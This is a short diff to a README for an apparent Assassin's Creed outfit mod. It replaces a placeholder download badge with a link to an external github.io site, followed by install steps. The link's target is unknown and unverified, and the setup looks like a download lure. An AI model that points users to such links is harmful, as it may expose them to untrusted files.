@@ -9,7 +9,7 @@ The pack is designed for fans who want to **blend the Assassin and Templar aesth
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://rogue-outfits-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Copy the **Rogue Outfits files** into your Assassin’s Creed installation folder.  
